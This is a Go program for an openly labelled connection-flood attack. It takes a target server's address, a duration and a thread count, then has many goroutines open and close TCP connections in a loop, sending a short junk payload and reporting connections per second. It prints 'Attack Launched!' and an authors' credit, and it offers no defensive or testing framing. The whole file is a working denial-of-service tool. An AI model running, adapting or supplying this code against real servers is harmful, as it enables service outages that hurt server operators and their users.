package main

import (
	"fmt"
	"net"
	"os"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

// Constants for packet types
const (
	PACKET_HANDSHAKE = 0x00
)

// Global variables to track connection metrics
var (
	connectionCount   int32
	failedConnections int32
	maxCPS            int32
)

// attackLoop creates multiple connections to the server and tracks the success and failure counts
func attackLoop(serverIp string, serverPort int, duration int, threadId int, wg *sync.WaitGroup) {
	defer wg.Done() // Ensure the wait group is decremented when done

	endTime := time.Now().Add(time.Duration(duration) * time.Second)
	for time.Now().Before(endTime) {
		// Try to establish a connection
		conn, err := net.Dial("tcp", fmt.Sprintf("%s:%d", serverIp, serverPort))
		if err != nil {
			// Increment failed connection count on error
			atomic.AddInt32(&failedConnections, 1)
			continue
		}
		// Send a packet and close the connection
		conn.Write([]byte("999999"))
		conn.Close()
		// Increment successful connection count
		atomic.AddInt32(&connectionCount, 1)
	}
}

// printConnectionCount periodically prints the current and average CPS, and the count of failed connections
func printConnectionCount(interval float64, duration int, done chan bool) {
	previousCount := int32(0)

	ticker := time.NewTicker(time.Duration(interval * 1000) * time.Millisecond)
	defer ticker.Stop()

	for {
		select {
		case <-ticker.C:
			currentCount := atomic.LoadInt32(&connectionCount)
			currentCPS := currentCount - previousCount

			// Update max CPS if current CPS is higher
			if currentCPS > maxCPS {
				atomic.StoreInt32(&maxCPS, currentCPS)
			}

			fmt.Printf("\r\033[1;34mCPS:\033[0m %d", currentCPS)
			previousCount = currentCount
		case <-done:
			return
		}
	}
}

func main() {
	// Display usage instructions if arguments are incorrect
	if len(os.Args) < 4 || len(os.Args) > 5 || os.Args[1] == "-h" || os.Args[1] == "--help" {
		fmt.Printf("Usage: %s <server_ip:port> <duration_seconds> <thread_count> [cpu_cores]\n", os.Args[0])
		return
	}

	// Parse server IP and port
	serverAddress := strings.Split(os.Args[1], ":")
	if len(serverAddress) != 2 {
		fmt.Println("Invalid format. Use <server_ip:port>")
		return
	}
	serverIp := serverAddress[0]
	serverPort, err := strconv.Atoi(serverAddress[1])
	if err != nil {
		fmt.Printf("Invalid port: %v\n", err)
		return
	}

	// Parse other command line arguments
	duration, err := strconv.Atoi(os.Args[2])
	if err != nil {
		fmt.Printf("Invalid duration: %v\n", err)
		return
	}
	botCount, err := strconv.Atoi(os.Args[3])
	if err != nil {
		fmt.Printf("Invalid thread count: %v\n", err)
		return
	}

	cpuCores := runtime.NumCPU() // Default to using all CPU cores
	if len(os.Args) == 5 {
		cpuCores, err = strconv.Atoi(os.Args[4])
		if err != nil {
			fmt.Printf("Invalid CPU cores: %v\n", err)
			return
		}
		cpuCores = min(cpuCores, runtime.NumCPU())
	}

	// Set the maximum number of CPU cores to use
	runtime.GOMAXPROCS(cpuCores)

	// Print attack launch message
	fmt.Printf("\033[1;36mAttack Launched!\033[0m\n")
	fmt.Printf("\033[1;34mHost:\033[0m %s:%d\n", serverIp, serverPort)
	fmt.Printf("\033[1;34mThreads:\033[0m %d\n", botCount)
	fmt.Printf("\033[1;34mCores:\033[0m %d\n", cpuCores)
	fmt.Printf("\033[1;34mTime:\033[0m %d seconds\n", duration)

	var wg sync.WaitGroup
	wg.Add(botCount) // Set the number of goroutines to wait for

	done := make(chan bool)
	go func() {
		printConnectionCount(1, duration, done)
	}()

	// Start the attack loops in separate goroutines
	for i := 0; i < botCount; i++ {
		go attackLoop(serverIp, serverPort, duration, i, &wg)
	}

	// Wait for all attack loops to complete
	wg.Wait()
	done <- true

	fmt.Println() // Add a newline for spacing
	fmt.Println("\033[1;35mMade by Randomname23233 and hakaneren112 <3\033[0m")
	fmt.Printf("\nAttack completed. MAX CPS: %d\n", atomic.LoadInt32(&maxCPS))
}

// min returns the smaller of two integers
func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}
